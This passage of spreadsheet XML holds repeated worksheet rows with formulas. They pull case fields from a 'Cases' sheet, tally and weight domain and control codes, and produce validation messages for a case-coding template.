      <c r="A152" s="11">
        <f>Cases!A152</f>
        <v/>
      </c>
      <c r="B152" s="11">
        <f>Cases!B152</f>
        <v/>
      </c>
      <c r="C152" s="11">
        <f>Cases!C152</f>
        <v/>
      </c>
      <c r="D152" s="11">
        <f>IF(Cases!F152="",LEFT(Cases!G152,120),Cases!F152)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E152:L152)=0,"",SUM(E152:L152))</f>
        <v/>
      </c>
      <c r="AJ152" s="13">
        <f>IF(AI152="","",N(E152)*3+N(F152)*2+N(G152)*2+N(H152)*2+N(I152)*2+N(J152)*3+N(K152)*3+N(L152)*3)</f>
        <v/>
      </c>
      <c r="AK152" s="13">
        <f>IF(AI152="","",COUNTIF(N152:AG152,1))</f>
        <v/>
      </c>
      <c r="AL152" s="13">
        <f>IF(OR(AJ152="",AJ152=0),"",ROUND(100*(AJ152-AK152)/AJ152,1))</f>
        <v/>
      </c>
      <c r="AM152" s="11">
        <f>IF(AI152="","",IF(AI152=0,"No domain coded 1; ","")&amp;IF(M152="","Primary domain missing; ",IF(IFERROR(INDEX(E152:L152,1,M152),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N152:AG152)&lt;&gt;AJ152,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH152="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN152" s="13">
        <f>IF(AND(AI152&lt;&gt;"",AM152=""),1,0)</f>
        <v/>
      </c>
      <c r="AO152" s="14" t="n"/>
    </row>
    <row r="153">
      <c r="A153" s="11">
        <f>Cases!A153</f>
        <v/>
      </c>
      <c r="B153" s="11">
        <f>Cases!B153</f>
        <v/>
      </c>
      <c r="C153" s="11">
        <f>Cases!C153</f>
        <v/>
      </c>
      <c r="D153" s="11">
        <f>IF(Cases!F153="",LEFT(Cases!G153,120),Cases!F153)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E153:L153)=0,"",SUM(E153:L153))</f>
        <v/>
      </c>
      <c r="AJ153" s="13">
        <f>IF(AI153="","",N(E153)*3+N(F153)*2+N(G153)*2+N(H153)*2+N(I153)*2+N(J153)*3+N(K153)*3+N(L153)*3)</f>
        <v/>
      </c>
      <c r="AK153" s="13">
        <f>IF(AI153="","",COUNTIF(N153:AG153,1))</f>
        <v/>
      </c>
      <c r="AL153" s="13">
        <f>IF(OR(AJ153="",AJ153=0),"",ROUND(100*(AJ153-AK153)/AJ153,1))</f>
        <v/>
      </c>
      <c r="AM153" s="11">
        <f>IF(AI153="","",IF(AI153=0,"No domain coded 1; ","")&amp;IF(M153="","Primary domain missing; ",IF(IFERROR(INDEX(E153:L153,1,M153),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N153:AG153)&lt;&gt;AJ153,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH153="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN153" s="13">
        <f>IF(AND(AI153&lt;&gt;"",AM153=""),1,0)</f>
        <v/>
      </c>
      <c r="AO153" s="14" t="n"/>
    </row>
    <row r="154">
      <c r="A154" s="11">
        <f>Cases!A154</f>
        <v/>
      </c>
      <c r="B154" s="11">
        <f>Cases!B154</f>
        <v/>
      </c>
      <c r="C154" s="11">
        <f>Cases!C154</f>
        <v/>
      </c>
      <c r="D154" s="11">
        <f>IF(Cases!F154="",LEFT(Cases!G154,120),Cases!F154)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E154:L154)=0,"",SUM(E154:L154))</f>
        <v/>
      </c>
      <c r="AJ154" s="13">
        <f>IF(AI154="","",N(E154)*3+N(F154)*2+N(G154)*2+N(H154)*2+N(I154)*2+N(J154)*3+N(K154)*3+N(L154)*3)</f>
        <v/>
      </c>
      <c r="AK154" s="13">
        <f>IF(AI154="","",COUNTIF(N154:AG154,1))</f>
        <v/>
      </c>
      <c r="AL154" s="13">
        <f>IF(OR(AJ154="",AJ154=0),"",ROUND(100*(AJ154-AK154)/AJ154,1))</f>
        <v/>
      </c>
      <c r="AM154" s="11">
        <f>IF(AI154="","",IF(AI154=0,"No domain coded 1; ","")&amp;IF(M154="","Primary domain missing; ",IF(IFERROR(INDEX(E154:L154,1,M154),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N154:AG154)&lt;&gt;AJ154,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH154="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN154" s="13">
        <f>IF(AND(AI154&lt;&gt;"",AM154=""),1,0)</f>
        <v/>
      </c>
      <c r="AO154" s="14" t="n"/>
    </row>
    <row r="155">
      <c r="A155" s="11">
        <f>Cases!A155</f>
        <v/>
      </c>
      <c r="B155" s="11">
        <f>Cases!B155</f>
        <v/>
      </c>
      <c r="C155" s="11">
        <f>Cases!C155</f>
        <v/>
      </c>
      <c r="D155" s="11">
        <f>IF(Cases!F155="",LEFT(Cases!G155,120),Cases!F155)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E155:L155)=0,"",SUM(E155:L155))</f>
        <v/>
      </c>
      <c r="AJ155" s="13">
        <f>IF(AI155="","",N(E155)*3+N(F155)*2+N(G155)*2+N(H155)*2+N(I155)*2+N(J155)*3+N(K155)*3+N(L155)*3)</f>
        <v/>
      </c>
      <c r="AK155" s="13">
        <f>IF(AI155="","",COUNTIF(N155:AG155,1))</f>
        <v/>
      </c>
      <c r="AL155" s="13">
        <f>IF(OR(AJ155="",AJ155=0),"",ROUND(100*(AJ155-AK155)/AJ155,1))</f>
        <v/>
      </c>
      <c r="AM155" s="11">
        <f>IF(AI155="","",IF(AI155=0,"No domain coded 1; ","")&amp;IF(M155="","Primary domain missing; ",IF(IFERROR(INDEX(E155:L155,1,M155),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N155:AG155)&lt;&gt;AJ155,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH155="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN155" s="13">
        <f>IF(AND(AI155&lt;&gt;"",AM155=""),1,0)</f>
        <v/>
      </c>
      <c r="AO155" s="14" t="n"/>
    </row>
    <row r="156">
      <c r="A156" s="11">
        <f>Cases!A156</f>
        <v/>
      </c>
      <c r="B156" s="11">
        <f>Cases!B156</f>
        <v/>
      </c>
      <c r="C156" s="11">
        <f>Cases!C156</f>
        <v/>
      </c>
      <c r="D156" s="11">
        <f>IF(Cases!F156="",LEFT(Cases!G156,120),Cases!F156)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E156:L156)=0,"",SUM(E156:L156))</f>
        <v/>
      </c>
      <c r="AJ156" s="13">
        <f>IF(AI156="","",N(E156)*3+N(F156)*2+N(G156)*2+N(H156)*2+N(I156)*2+N(J156)*3+N(K156)*3+N(L156)*3)</f>
        <v/>
      </c>
      <c r="AK156" s="13">
        <f>IF(AI156="","",COUNTIF(N156:AG156,1))</f>
        <v/>
      </c>
      <c r="AL156" s="13">
        <f>IF(OR(AJ156="",AJ156=0),"",ROUND(100*(AJ156-AK156)/AJ156,1))</f>
        <v/>
      </c>
      <c r="AM156" s="11">
        <f>IF(AI156="","",IF(AI156=0,"No domain coded 1; ","")&amp;IF(M156="","Primary domain missing; ",IF(IFERROR(INDEX(E156:L156,1,M156),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N156:AG156)&lt;&gt;AJ156,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH156="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN156" s="13">
        <f>IF(AND(AI156&lt;&gt;"",AM156=""),1,0)</f>
        <v/>
      </c>
      <c r="AO156" s="14" t="n"/>
    </row>
    <row r="157">
      <c r="A157" s="11">
        <f>Cases!A157</f>
        <v/>
      </c>
      <c r="B157" s="11">
        <f>Cases!B157</f>
        <v/>
      </c>
      <c r="C157" s="11">
        <f>Cases!C157</f>
        <v/>
      </c>
      <c r="D157" s="11">
        <f>IF(Cases!F157="",LEFT(Cases!G157,120),Cases!F157)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E157:L157)=0,"",SUM(E157:L157))</f>
        <v/>
      </c>
      <c r="AJ157" s="13">
        <f>IF(AI157="","",N(E157)*3+N(F157)*2+N(G157)*2+N(H157)*2+N(I157)*2+N(J157)*3+N(K157)*3+N(L157)*3)</f>
        <v/>
      </c>
      <c r="AK157" s="13">
        <f>IF(AI157="","",COUNTIF(N157:AG157,1))</f>
        <v/>
      </c>
      <c r="AL157" s="13">
        <f>IF(OR(AJ157="",AJ157=0),"",ROUND(100*(AJ157-AK157)/AJ157,1))</f>
        <v/>
      </c>
      <c r="AM157" s="11">
        <f>IF(AI157="","",IF(AI157=0,"No domain coded 1; ","")&amp;IF(M157="","Primary domain missing; ",IF(IFERROR(INDEX(E157:L157,1,M157),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N157:AG157)&lt;&gt;AJ157,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH157="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN157" s="13">
        <f>IF(AND(AI157&lt;&gt;"",AM157=""),1,0)</f>
        <v/>
      </c>
      <c r="AO157" s="14" t="n"/>
    </row>
    <row r="158">
      <c r="A158" s="11">
        <f>Cases!A158</f>
        <v/>
      </c>
      <c r="B158" s="11">
        <f>Cases!B158</f>
        <v/>
      </c>
      <c r="C158" s="11">
        <f>Cases!C158</f>
        <v/>
      </c>
      <c r="D158" s="11">
        <f>IF(Cases!F158="",LEFT(Cases!G158,120),Cases!F158)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E158:L158)=0,"",SUM(E158:L158))</f>
        <v/>
      </c>
      <c r="AJ158" s="13">
        <f>IF(AI158="","",N(E158)*3+N(F158)*2+N(G158)*2+N(H158)*2+N(I158)*2+N(J158)*3+N(K158)*3+N(L158)*3)</f>
        <v/>
      </c>
      <c r="AK158" s="13">
        <f>IF(AI158="","",COUNTIF(N158:AG158,1))</f>
        <v/>
      </c>
      <c r="AL158" s="13">
        <f>IF(OR(AJ158="",AJ158=0),"",ROUND(100*(AJ158-AK158)/AJ158,1))</f>
        <v/>
      </c>
      <c r="AM158" s="11">
        <f>IF(AI158="","",IF(AI158=0,"No domain coded 1; ","")&amp;IF(M158="","Primary domain missing; ",IF(IFERROR(INDEX(E158:L158,1,M158),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N158:AG158)&lt;&gt;AJ158,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH158="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN158" s="13">
        <f>IF(AND(AI158&lt;&gt;"",AM158=""),1,0)</f>
        <v/>
      </c>
      <c r="AO158" s="14" t="n"/>
    </row>
    <row r="159">
      <c r="A159" s="11">
        <f>Cases!A159</f>
        <v/>
      </c>
      <c r="B159" s="11">
        <f>Cases!B159</f>
        <v/>
      </c>
      <c r="C159" s="11">
        <f>Cases!C159</f>
        <v/>
      </c>
      <c r="D159" s="11">
        <f>IF(Cases!F159="",LEFT(Cases!G159,120),Cases!F159)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E159:L159)=0,"",SUM(E159:L159))</f>
        <v/>
      </c>
      <c r="AJ159" s="13">
        <f>IF(AI159="","",N(E159)*3+N(F159)*2+N(G159)*2+N(H159)*2+N(I159)*2+N(J159)*3+N(K159)*3+N(L159)*3)</f>
        <v/>
      </c>
      <c r="AK159" s="13">
        <f>IF(AI159="","",COUNTIF(N159:AG159,1))</f>
        <v/>
      </c>
      <c r="AL159" s="13">
        <f>IF(OR(AJ159="",AJ159=0),"",ROUND(100*(AJ159-AK159)/AJ159,1))</f>
        <v/>
      </c>
      <c r="AM159" s="11">
        <f>IF(AI159="","",IF(AI159=0,"No domain coded 1; ","")&amp;IF(M159="","Primary domain missing; ",IF(IFERROR(INDEX(E159:L159,1,M159),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N159:AG159)&lt;&gt;AJ159,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH159="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN159" s="13">
        <f>IF(AND(AI159&lt;&gt;"",AM159=""),1,0)</f>
        <v/>
      </c>
      <c r="AO159" s="14" t="n"/>
    </row>
    <row r="160">
      <c r="A160" s="11">
        <f>Cases!A160</f>
        <v/>
      </c>
      <c r="B160" s="11">
        <f>Cases!B160</f>
        <v/>
      </c>
      <c r="C160" s="11">
        <f>Cases!C160</f>
        <v/>
      </c>
      <c r="D160" s="11">
        <f>IF(Cases!F160="",LEFT(Cases!G160,120),Cases!F160)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E160:L160)=0,"",SUM(E160:L160))</f>
        <v/>
      </c>
      <c r="AJ160" s="13">
        <f>IF(AI160="","",N(E160)*3+N(F160)*2+N(G160)*2+N(H160)*2+N(I160)*2+N(J160)*3+N(K160)*3+N(L160)*3)</f>
        <v/>
      </c>
      <c r="AK160" s="13">
        <f>IF(AI160="","",COUNTIF(N160:AG160,1))</f>
        <v/>
      </c>
      <c r="AL160" s="13">
        <f>IF(OR(AJ160="",AJ160=0),"",ROUND(100*(AJ160-AK160)/AJ160,1))</f>
        <v/>
      </c>
      <c r="AM160" s="11">
        <f>IF(AI160="","",IF(AI160=0,"No domain coded 1; ","")&amp;IF(M160="","Primary domain missing; ",IF(IFERROR(INDEX(E160:L160,1,M160),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N160:AG160)&lt;&gt;AJ160,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH160="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN160" s="13">
        <f>IF(AND(AI160&lt;&gt;"",AM160=""),1,0)</f>
        <v/>
      </c>
      <c r="AO160" s="14" t="n"/>
    </row>
    <row r="161">
      <c r="A161" s="11">
        <f>Cases!A161</f>
        <v/>
      </c>
      <c r="B161" s="11">
        <f>Cases!B161</f>
        <v/>
      </c>
      <c r="C161" s="11">
        <f>Cases!C161</f>
        <v/>
      </c>
      <c r="D161" s="11">
        <f>IF(Cases!F161="",LEFT(Cases!G161,120),Cases!F161)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E161:L161)=0,"",SUM(E161:L161))</f>
        <v/>
      </c>
      <c r="AJ161" s="13">
        <f>IF(AI161="","",N(E161)*3+N(F161)*2+N(G161)*2+N(H161)*2+N(I161)*2+N(J161)*3+N(K161)*3+N(L161)*3)</f>
        <v/>
      </c>
      <c r="AK161" s="13">
        <f>IF(AI161="","",COUNTIF(N161:AG161,1))</f>
        <v/>
      </c>
      <c r="AL161" s="13">
        <f>IF(OR(AJ161="",AJ161=0),"",ROUND(100*(AJ161-AK161)/AJ161,1))</f>
        <v/>
      </c>
      <c r="AM161" s="11">
        <f>IF(AI161="","",IF(AI161=0,"No domain coded 1; ","")&amp;IF(M161="","Primary domain missing; ",IF(IFERROR(INDEX(E161:L161,1,M161),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N161:AG161)&lt;&gt;AJ161,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH161="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN161" s="13">
        <f>IF(AND(AI161&lt;&gt;"",AM161=""),1,0)</f>
        <v/>
      </c>
      <c r="AO161" s="14" t="n"/>
    </row>
    <row r="162">
      <c r="A162" s="11">
        <f>Cases!A162</f>
        <v/>
      </c>
      <c r="B162" s="11">
        <f>Cases!B162</f>
        <v/>
      </c>
      <c r="C162" s="11">
        <f>Cases!C162</f>
        <v/>
      </c>
      <c r="D162" s="11">
        <f>IF(Cases!F162="",LEFT(Cases!G162,120),Cases!F162)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E162:L162)=0,"",SUM(E162:L162))</f>
        <v/>
      </c>
      <c r="AJ162" s="13">
        <f>IF(AI162="","",N(E162)*3+N(F162)*2+N(G162)*2+N(H162)*2+N(I162)*2+N(J162)*3+N(K162)*3+N(L162)*3)</f>
        <v/>
      </c>
      <c r="AK162" s="13">
        <f>IF(AI162="","",COUNTIF(N162:AG162,1))</f>
        <v/>
      </c>
      <c r="AL162" s="13">
        <f>IF(OR(AJ162="",AJ162=0),"",ROUND(100*(AJ162-AK162)/AJ162,1))</f>
        <v/>
      </c>
      <c r="AM162" s="11">
        <f>IF(AI162="","",IF(AI162=0,"No domain coded 1; ","")&amp;IF(M162="","Primary domain missing; ",IF(IFERROR(INDEX(E162:L162,1,M162),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N162:AG162)&lt;&gt;AJ162,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH162="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN162" s="13">
        <f>IF(AND(AI162&lt;&gt;"",AM162=""),1,0)</f>
        <v/>
      </c>
      <c r="AO162" s="14" t="n"/>
    </row>
    <row r="163">
      <c r="A163" s="11">
        <f>Cases!A163</f>
        <v/>
      </c>
      <c r="B163" s="11">
        <f>Cases!B163</f>
        <v/>
      </c>
      <c r="C163" s="11">
        <f>Cases!C163</f>
        <v/>
      </c>
      <c r="D163" s="11">
        <f>IF(Cases!F163="",LEFT(Cases!G163,120),Cases!F163)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E163:L163)=0,"",SUM(E163:L163))</f>
        <v/>
      </c>
      <c r="AJ163" s="13">
        <f>IF(AI163="","",N(E163)*3+N(F163)*2+N(G163)*2+N(H163)*2+N(I163)*2+N(J163)*3+N(K163)*3+N(L163)*3)</f>
        <v/>
      </c>
      <c r="AK163" s="13">
        <f>IF(AI163="","",COUNTIF(N163:AG163,1))</f>
        <v/>
      </c>
      <c r="AL163" s="13">
        <f>IF(OR(AJ163="",AJ163=0),"",ROUND(100*(AJ163-AK163)/AJ163,1))</f>
        <v/>
      </c>
      <c r="AM163" s="11">
        <f>IF(AI163="","",IF(AI163=0,"No domain coded 1; ","")&amp;IF(M163="","Primary domain missing; ",IF(IFERROR(INDEX(E163:L163,1,M163),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N163:AG163)&lt;&gt;AJ163,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH163="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN163" s="13">
        <f>IF(AND(AI163&lt;&gt;"",AM163=""),1,0)</f>
        <v/>
      </c>
      <c r="AO163" s="14" t="n"/>
    </row>
    <row r="164">
      <c r="A164" s="11">
        <f>Cases!A164</f>
        <v/>
      </c>
      <c r="B164" s="11">
        <f>Cases!B164</f>
        <v/>
      </c>
      <c r="C164" s="11">
        <f>Cases!C164</f>
        <v/>
      </c>
      <c r="D164" s="11">
        <f>IF(Cases!F164="",LEFT(Cases!G164,120),Cases!F164)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E164:L164)=0,"",SUM(E164:L164))</f>
        <v/>
      </c>
      <c r="AJ164" s="13">
        <f>IF(AI164="","",N(E164)*3+N(F164)*2+N(G164)*2+N(H164)*2+N(I164)*2+N(J164)*3+N(K164)*3+N(L164)*3)</f>
        <v/>
      </c>
      <c r="AK164" s="13">
        <f>IF(AI164="","",COUNTIF(N164:AG164,1))</f>
        <v/>
      </c>
      <c r="AL164" s="13">
        <f>IF(OR(AJ164="",AJ164=0),"",ROUND(100*(AJ164-AK164)/AJ164,1))</f>
        <v/>
      </c>
      <c r="AM164" s="11">
        <f>IF(AI164="","",IF(AI164=0,"No domain coded 1; ","")&amp;IF(M164="","Primary domain missing; ",IF(IFERROR(INDEX(E164:L164,1,M164),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N164:AG164)&lt;&gt;AJ164,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH164="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN164" s="13">
        <f>IF(AND(AI164&lt;&gt;"",AM164=""),1,0)</f>
        <v/>
      </c>
      <c r="AO164" s="14" t="n"/>
    </row>
    <row r="165">
      <c r="A165" s="11">
        <f>Cases!A165</f>
        <v/>
      </c>
      <c r="B165" s="11">
        <f>Cases!B165</f>
        <v/>
      </c>
      <c r="C165" s="11">
        <f>Cases!C165</f>
        <v/>
      </c>
      <c r="D165" s="11">
        <f>IF(Cases!F165="",LEFT(Cases!G165,120),Cases!F165)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E165:L165)=0,"",SUM(E165:L165))</f>
        <v/>
      </c>
      <c r="AJ165" s="13">
        <f>IF(AI165="","",N(E165)*3+N(F165)*2+N(G165)*2+N(H165)*2+N(I165)*2+N(J165)*3+N(K165)*3+N(L165)*3)</f>
        <v/>
      </c>
      <c r="AK165" s="13">
        <f>IF(AI165="","",COUNTIF(N165:AG165,1))</f>
        <v/>
      </c>
      <c r="AL165" s="13">
        <f>IF(OR(AJ165="",AJ165=0),"",ROUND(100*(AJ165-AK165)/AJ165,1))</f>
        <v/>
      </c>
      <c r="AM165" s="11">
        <f>IF(AI165="","",IF(AI165=0,"No domain coded 1; ","")&amp;IF(M165="","Primary domain missing; ",IF(IFERROR(INDEX(E165:L165,1,M165),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N165:AG165)&lt;&gt;AJ165,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH165="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN165" s="13">
        <f>IF(AND(AI165&lt;&gt;"",AM165=""),1,0)</f>
        <v/>
      </c>
      <c r="AO165" s="14" t="n"/>
    </row>
    <row r="166">
      <c r="A166" s="11">
        <f>Cases!A166</f>
        <v/>
      </c>
      <c r="B166" s="11">
        <f>Cases!B166</f>
        <v/>
      </c>
      <c r="C166" s="11">
        <f>Cases!C166</f>
        <v/>
      </c>
      <c r="D166" s="11">
        <f>IF(Cases!F166="",LEFT(Cases!G166,120),Cases!F166)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E166:L166)=0,"",SUM(E166:L166))</f>
        <v/>
      </c>
      <c r="AJ166" s="13">
        <f>IF(AI166="","",N(E166)*3+N(F166)*2+N(G166)*2+N(H166)*2+N(I166)*2+N(J166)*3+N(K166)*3+N(L166)*3)</f>
        <v/>
      </c>
      <c r="AK166" s="13">
        <f>IF(AI166="","",COUNTIF(N166:AG166,1))</f>
        <v/>
      </c>
      <c r="AL166" s="13">
        <f>IF(OR(AJ166="",AJ166=0),"",ROUND(100*(AJ166-AK166)/AJ166,1))</f>
        <v/>
      </c>
      <c r="AM166" s="11">
        <f>IF(AI166="","",IF(AI166=0,"No domain coded 1; ","")&amp;IF(M166="","Primary domain missing; ",IF(IFERROR(INDEX(E166:L166,1,M166),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N166:AG166)&lt;&gt;AJ166,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH166="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN166" s="13">
        <f>IF(AND(AI166&lt;&gt;"",AM166=""),1,0)</f>
        <v/>
      </c>
      <c r="AO166" s="14" t="n"/>
    </row>
    <row r="167">
      <c r="A167" s="11">
        <f>Cases!A167</f>
        <v/>
      </c>
      <c r="B167" s="11">
        <f>Cases!B167</f>
        <v/>
      </c>
      <c r="C167" s="11">
        <f>Cases!C167</f>
        <v/>
      </c>
      <c r="D167" s="11">
        <f>IF(Cases!F167="",LEFT(Cases!G167,120),Cases!F167)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E167:L167)=0,"",SUM(E167:L167))</f>
        <v/>
      </c>
      <c r="AJ167" s="13">
        <f>IF(AI167="","",N(E167)*3+N(F167)*2+N(G167)*2+N(H167)*2+N(I167)*2+N(J167)*3+N(K167)*3+N(L167)*3)</f>
        <v/>
      </c>
      <c r="AK167" s="13">
        <f>IF(AI167="","",COUNTIF(N167:AG167,1))</f>
        <v/>
      </c>
      <c r="AL167" s="13">
        <f>IF(OR(AJ167="",AJ167=0),"",ROUND(100*(AJ167-AK167)/AJ167,1))</f>
        <v/>
      </c>
      <c r="AM167" s="11">
        <f>IF(AI167="","",IF(AI167=0,"No domain coded 1; ","")&amp;IF(M167="","Primary domain missing; ",IF(IFERROR(INDEX(E167:L167,1,M167),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N167:AG167)&lt;&gt;AJ167,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH167="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN167" s="13">
        <f>IF(AND(AI167&lt;&gt;"",AM167=""),1,0)</f>
        <v/>
      </c>
      <c r="AO167" s="14" t="n"/>
    </row>
    <row r="168">
      <c r="A168" s="11">
        <f>Cases!A168</f>
        <v/>
      </c>
      <c r="B168" s="11">
        <f>Cases!B168</f>
        <v/>
      </c>
      <c r="C168" s="11">
        <f>Cases!C168</f>
        <v/>
      </c>
      <c r="D168" s="11">
        <f>IF(Cases!F168="",LEFT(Cases!G168,120),Cases!F168)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E168:L168)=0,"",SUM(E168:L168))</f>
        <v/>
      </c>
      <c r="AJ168" s="13">
        <f>IF(AI168="","",N(E168)*3+N(F168)*2+N(G168)*2+N(H168)*2+N(I168)*2+N(J168)*3+N(K168)*3+N(L168)*3)</f>
        <v/>
      </c>
      <c r="AK168" s="13">
        <f>IF(AI168="","",COUNTIF(N168:AG168,1))</f>
        <v/>
      </c>
      <c r="AL168" s="13">
        <f>IF(OR(AJ168="",AJ168=0),"",ROUND(100*(AJ168-AK168)/AJ168,1))</f>
        <v/>
      </c>
      <c r="AM168" s="11">
        <f>IF(AI168="","",IF(AI168=0,"No domain coded 1; ","")&amp;IF(M168="","Primary domain missing; ",IF(IFERROR(INDEX(E168:L168,1,M168),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N168:AG168)&lt;&gt;AJ168,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH168="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN168" s="13">
        <f>IF(AND(AI168&lt;&gt;"",AM168=""),1,0)</f>
        <v/>
      </c>
      <c r="AO168" s="14" t="n"/>
    </row>
    <row r="169">
      <c r="A169" s="11">
        <f>Cases!A169</f>
        <v/>
      </c>
      <c r="B169" s="11">
        <f>Cases!B169</f>
        <v/>
      </c>
      <c r="C169" s="11">
        <f>Cases!C169</f>
        <v/>
      </c>
      <c r="D169" s="11">
        <f>IF(Cases!F169="",LEFT(Cases!G169,120),Cases!F169)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E169:L169)=0,"",SUM(E169:L169))</f>
        <v/>
      </c>
      <c r="AJ169" s="13">
        <f>IF(AI169="","",N(E169)*3+N(F169)*2+N(G169)*2+N(H169)*2+N(I169)*2+N(J169)*3+N(K169)*3+N(L169)*3)</f>
        <v/>
      </c>
      <c r="AK169" s="13">
        <f>IF(AI169="","",COUNTIF(N169:AG169,1))</f>
        <v/>
      </c>
      <c r="AL169" s="13">
        <f>IF(OR(AJ169="",AJ169=0),"",ROUND(100*(AJ169-AK169)/AJ169,1))</f>
        <v/>
      </c>
      <c r="AM169" s="11">
        <f>IF(AI169="","",IF(AI169=0,"No domain coded 1; ","")&amp;IF(M169="","Primary domain missing; ",IF(IFERROR(INDEX(E169:L169,1,M169),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N169:AG169)&lt;&gt;AJ169,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH169="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN169" s="13">
        <f>IF(AND(AI169&lt;&gt;"",AM169=""),1,0)</f>
        <v/>
      </c>
      <c r="AO169" s="14" t="n"/>
    </row>
    <row r="170">
      <c r="A170" s="11">
        <f>Cases!A170</f>
        <v/>
      </c>
      <c r="B170" s="11">
        <f>Cases!B170</f>
        <v/>
      </c>
      <c r="C170" s="11">
        <f>Cases!C170</f>
        <v/>
      </c>
      <c r="D170" s="11">
        <f>IF(Cases!F170="",LEFT(Cases!G170,120),Cases!F170)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E170:L170)=0,"",SUM(E170:L170))</f>
        <v/>
      </c>
      <c r="AJ170" s="13">
        <f>IF(AI170="","",N(E170)*3+N(F170)*2+N(G170)*2+N(H170)*2+N(I170)*2+N(J170)*3+N(K170)*3+N(L170)*3)</f>
        <v/>
      </c>
      <c r="AK170" s="13">
        <f>IF(AI170="","",COUNTIF(N170:AG170,1))</f>
        <v/>
      </c>
      <c r="AL170" s="13">
        <f>IF(OR(AJ170="",AJ170=0),"",ROUND(100*(AJ170-AK170)/AJ170,1))</f>
        <v/>
      </c>
      <c r="AM170" s="11">
        <f>IF(AI170="","",IF(AI170=0,"No domain coded 1; ","")&amp;IF(M170="","Primary domain missing; ",IF(IFERROR(INDEX(E170:L170,1,M170),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N170:AG170)&lt;&gt;AJ170,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH170="","Covered missing; ",""))</f>
